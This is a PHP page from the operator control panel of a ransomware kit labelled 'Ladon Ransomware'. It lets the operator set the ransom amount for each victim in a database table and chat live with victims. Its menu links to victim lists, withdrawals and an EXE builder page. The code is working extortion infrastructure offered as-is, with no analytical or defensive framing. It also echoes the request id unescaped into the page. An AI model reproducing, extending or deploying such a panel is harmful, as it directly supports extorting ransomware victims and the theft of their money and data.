<?php
include_once("config.php");
if(!empty($_POST['message'])){
    $message = $_POST['message'];



}
$contactid = $_GET['id'];
if(empty($contactid)){
    die("Error fetching page! GO BACK AND TRY AGAIN");
}

  else  if(!empty($_POST['amount']) && !empty($_GET['id'])){
            $pazo = $_POST['amount'];
            $pidz = $_GET['id'];
            $update = "UPDATE `ransomware` SET `amount` = :amount WHERE `username` = :username AND `contactid` = :contactid";
            if($sth = $db->prepare($update)){
                $sth->bindParam(":amount", $pazo);
                $sth->bindParam(":username", $session);
                $sth->bindParam(":contactid", $pidz);
                $sth->execute();
            }
        }
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
        <meta name="description" content="">
        <meta name="keyword" content="">

        <title>Ladon Ransomware</title>

        <link href="assets/css/bootstrap.min.css" rel="stylesheet">
        <link href="assets/css/slidebars.min.css" rel="stylesheet">
        <link href="assets/css/icons.css" rel="stylesheet">
        <link href="assets/css/menu.css" rel="stylesheet" type="text/css">
        <link href="assets/css/style.css" rel="stylesheet">
    </head>

    <body class="sticky-header">
        <section>
            <!-- sidebar left start-->
            <div class="sidebar-left">
                <div class="sidebar-left-info">
  
                                        
                    <!--sidebar nav start-->
                    <ul class="side-navigation">
                        <li class="active">
                            <a href="index.php"><span>Dashboard</span></a>
                        </li>
                       
                         <li class="active"><a href="data.php"> <span>Victims</span></a>
                        </li>
                        <li class="active"><a href="withdraw.php"> <span>Withdrawl</span></a>
                        </li>

                        <li class="active"><a href="extensions.php"> <span>Extensions</span></a>
                        </li>
			<li class="active"><a href="debug.php"> <span>Debug EXE</span></a>
                        </li>
                        <?php
                         if($session == hash('sha256', "admin"))
                        { ?>
                        <li class="active"><a href="users.php"> <span>Add Users</span></a>
                        </li>
                        <?php
                        }
                            ?>

                        <li class="active"><a href="logout.php"> <span>LogOut</span></a>
                        </li>
                    </ul><!--sidebar nav end-->
                </div>
            </div><!-- sidebar left end-->

            <!-- body content start-->
            <div class="body-content">
                <!-- header section start-->
                <div class="header-section">
                    <!--logo and logo icon start-->
                    <div class="logo">
                        <a href="index.php">
                            <!--<i class="fa fa-maxcdn"></i>-->
                            <span class="brand-name">LADON RANSOMWARE</span>
                        </a>
                    </div>

                    <!--toggle button start-->
                    <a class="toggle-btn"><i class="ti ti-menu"></i></a>
                    <!--toggle button end-->

                  

                </div>
                <!-- header section end-->
<div class="page-head">
                        <h4 class="mt-2 mb-2">Change Ransomware Amount</h4>
                    </div>
                    <div class="row">
                        <div class="col-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Change Ransomware Amount</h5>              
                                    <div class="general-label">
                                        <form class="form-inline" role="form" method="POST">
                                            <div class="form-group">
                                                <label class="sr-only" for="">New Amount</label>
                                                <input class="form-control ml-2" id="amount" name="amount" placeholder="123">
                                            </div>
                                            <button type="submit" class="btn btn-success ml-2">Change Amount!</button>
                                        </form>       
                                    </div>                            
                                </div>
                            </div>
                        </div>
                    </div><!--end row-->
                <div class="container-fluid">
                    <div class="page-head">
                        <h4 class="mt-2 mb-2">Chat</h4>
                    </div>



                    <div class="row">
                        <div class="col-lg-12 col-sm-12">
                            <div class="card m-b-30">
                                <div class="card-body">
                                    <h5 class="header-title pb-3">Chatting with <?php echo $contactid; ?></h5>           
                                    <div class="row">
                                        <div class="col-sm-12">

                                            <div class="form-group row">
                                                <div class="col-md-12">
                                                    <textarea id="chat" class="form-control" rows="10" readonly=""></textarea>
                                                    <div class="input-group mt-2">
                                                        <input type="email" id="messagez" class="form-control" placeholder="Message">
                                                        <span class="input-group-append">
                                                        <button type="button" id="sendmsg" class="btn  btn-primary">Send Message</button>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>              
                                </div>
                            </div>
                        </div>

                        
                    </div>                            
                    
                </div><!--end container-->

                <!--footer section start-->
                <footer class="footer">
                    LANDON RANSOMWARE
                </footer>
                <!--footer section end-->



            </div>
            <!--end body content-->
        </section>

        <!-- jQuery -->
       
        <script src="assets/js/jquery-3.2.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery-migrate.js"></script>
        <script src="assets/js/jquery.slimscroll.min.js"></script>

<script>
        function post(){
        var messagez = $("#messagez").val();
            $.post('ownerdata.php?comment=<?php echo $contactid; ?>', { message : messagez }, function(data) {
                            $("#messagez").val("");
                        });
        }
        $(document).keypress(function(e) {
        var keycode = (e.keyCode ? e.keyCode : e.which);
            if (keycode == '13') {
                post();
            }
        });
        $("#sendmsg").click(function(){
            post();
        });
        setInterval(function () {
            $.ajax({
                url: 'ownerdata.php?chat=<?php echo $contactid; ?>',
                type:"GET",
                success: function (resp) {
                    try{
                        $('#chat').empty().append(resp);
                    }catch(e){

                    }
                    
                }
            });
        }, 1000);

</script>
    </body>
</html>
